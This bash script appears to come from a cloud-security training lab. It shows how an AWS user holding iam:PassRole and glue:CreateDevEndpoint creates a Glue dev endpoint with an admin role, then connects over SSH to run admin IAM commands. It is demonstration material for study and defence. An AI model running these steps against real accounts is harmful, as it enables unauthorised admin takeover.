#!/bin/bash

# Demo script for iam:PassRole + glue:CreateDevEndpoint privilege escalation
# This script demonstrates how a user with PassRole and CreateDevEndpoint can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-glue-001-to-admin-starting-user"
TARGET_ROLE="pl-prod-glue-001-to-admin-target-role"
DEV_ENDPOINT_NAME="pl-glue-001-demo-endpoint"
SSH_KEY_PATH="/tmp/pl-glue-001-demo-key"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue CreateDevEndpoint Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${RED}⚠ WARNING: Glue Dev Endpoints Cost ~$2.20/hour${NC}"
echo -e "${RED}⚠ This demo creates a Glue Dev Endpoint which incurs hourly charges${NC}"
echo -e "${RED}⚠ The endpoint will be running until you run cleanup_attack.sh${NC}"
echo -e "${YELLOW}Press Enter to continue or Ctrl+C to cancel...${NC}"
read

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_glue_001_iam_passrole_glue_createdevendpoint.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify lack of admin permissions
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Generate SSH key pair
echo -e "${YELLOW}Step 5: Generating SSH key pair for Glue Dev Endpoint${NC}"
if [ -f "$SSH_KEY_PATH" ]; then
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
fi

ssh-keygen -t rsa -b 2048 -f "$SSH_KEY_PATH" -N "" -q
SSH_PUBLIC_KEY=$(cat "${SSH_KEY_PATH}.pub")
echo "Generated SSH key pair at: $SSH_KEY_PATH"
echo -e "${GREEN}✓ SSH key pair generated${NC}\n"

# Step 6: Create Glue Dev Endpoint with admin role
echo -e "${YELLOW}Step 6: Creating Glue Dev Endpoint with admin role${NC}"
echo "This is the privilege escalation vector - passing the admin role to Glue..."
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $ROLE_ARN"
echo "Dev Endpoint Name: $DEV_ENDPOINT_NAME"
echo ""

aws glue create-dev-endpoint \
    --endpoint-name "$DEV_ENDPOINT_NAME" \
    --role-arn "$ROLE_ARN" \
    --public-key "$SSH_PUBLIC_KEY" \
    --glue-version "1.0" \
    --number-of-nodes 2 \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created Glue Dev Endpoint with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to create Glue Dev Endpoint${NC}"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi
echo ""

# Step 7: Wait for endpoint to be ready
echo -e "${YELLOW}Step 7: Waiting for Dev Endpoint to be ready${NC}"
echo -e "${BLUE}This may take 5-10 minutes. The endpoint needs to provision workers...${NC}"
echo "Status checks will occur every 30 seconds"
echo ""

MAX_WAIT=20  # 20 checks * 30 seconds = 10 minutes max wait
WAIT_COUNT=0
ENDPOINT_STATUS=""

while [ $WAIT_COUNT -lt $MAX_WAIT ]; do
    ENDPOINT_STATUS=$(aws glue get-dev-endpoint \
        --endpoint-name "$DEV_ENDPOINT_NAME" \
        --query 'DevEndpoint.Status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo -e "Check $((WAIT_COUNT + 1))/$MAX_WAIT - Status: ${BLUE}$ENDPOINT_STATUS${NC}"

    if [ "$ENDPOINT_STATUS" = "READY" ]; then
        echo -e "${GREEN}✓ Dev Endpoint is ready!${NC}\n"
        break
    elif [ "$ENDPOINT_STATUS" = "FAILED" ] || [ "$ENDPOINT_STATUS" = "UNKNOWN" ]; then
        echo -e "${RED}Error: Dev Endpoint failed to provision or was not found${NC}"
        rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
        exit 1
    fi

    sleep 30
    WAIT_COUNT=$((WAIT_COUNT + 1))
done

if [ "$ENDPOINT_STATUS" != "READY" ]; then
    echo -e "${RED}Error: Dev Endpoint did not become ready within 10 minutes${NC}"
    echo "You may need to wait longer or check the AWS Console for errors"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi

# Step 8: Get endpoint address
echo -e "${YELLOW}Step 8: Retrieving Dev Endpoint connection details${NC}"
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
    --endpoint-name "$DEV_ENDPOINT_NAME" \
    --query 'DevEndpoint.PublicAddress' \
    --output text)

if [ -z "$ENDPOINT_ADDRESS" ] || [ "$ENDPOINT_ADDRESS" = "None" ]; then
    echo -e "${RED}Error: Could not retrieve endpoint address${NC}"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi

echo "Endpoint Address: $ENDPOINT_ADDRESS"
echo -e "${GREEN}✓ Retrieved endpoint connection details${NC}\n"

# Step 9: Connect to endpoint and verify admin access
echo -e "${YELLOW}Step 9: Connecting to Dev Endpoint via SSH and verifying admin access${NC}"
echo "The Glue Dev Endpoint runs with the admin role's credentials..."
echo "Executing: aws iam list-users --max-items 3"
echo ""

# Set SSH options for non-interactive execution
SSH_OPTIONS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30"

# Execute AWS CLI command on the Glue Dev Endpoint and display output directly
if ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws iam list-users --max-items 3 --output table"; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED via Glue Dev Endpoint${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "This could be due to SSH connectivity issues or endpoint not fully ready"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi
echo ""

# Step 10: Demonstrate credential extraction
echo -e "${YELLOW}Step 10: Extracting AWS credentials from the endpoint${NC}"
echo "Retrieving the admin role credentials from the endpoint environment..."
echo ""

CREDS_OUTPUT=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws sts get-caller-identity --output json" 2>/dev/null)

if [ $? -eq 0 ] && [ -n "$CREDS_OUTPUT" ]; then
    echo "Identity running on the endpoint:"
    echo "$CREDS_OUTPUT" | jq '.'
    echo ""

    ENDPOINT_ARN=$(echo "$CREDS_OUTPUT" | jq -r '.Arn')
    if [[ $ENDPOINT_ARN == *"$TARGET_ROLE"* ]]; then
        echo -e "${GREEN}✓ Confirmed: Endpoint is running with admin role credentials${NC}"
    else
        echo -e "${YELLOW}⚠ Warning: Endpoint may not be using the expected role${NC}"
    fi
else
    echo -e "${YELLOW}⚠ Could not retrieve identity (non-critical)${NC}"
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + glue:CreateDevEndpoint)"
echo "2. Created Glue Dev Endpoint with admin role: $TARGET_ROLE"
echo "3. Waited for endpoint to provision and become ready"
echo "4. Connected via SSH to the endpoint"
echo "5. Executed AWS CLI commands with admin role credentials"
echo "6. Achieved: Administrator Access via Glue Dev Endpoint"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (PassRole + CreateDevEndpoint) → Glue Dev Endpoint with $TARGET_ROLE"
echo -e "  → (SSH Access) → Execute AWS commands as admin"
echo -e "  → Admin Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Glue Dev Endpoint: $DEV_ENDPOINT_NAME"
echo "- Endpoint Address: $ENDPOINT_ADDRESS"
echo "- SSH Private Key: $SSH_KEY_PATH"
echo "- SSH Public Key: ${SSH_KEY_PATH}.pub"
echo "- Endpoint Role: $TARGET_ROLE"

echo -e "\n${RED}⚠ CRITICAL: The Glue Dev Endpoint is still running${NC}"
echo -e "${RED}⚠ Glue Dev Endpoints cost approximately $2.20/hour${NC}"
echo -e "${RED}⚠ You are being charged while the endpoint remains active${NC}"
echo ""
echo -e "${YELLOW}To clean up and stop charges:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
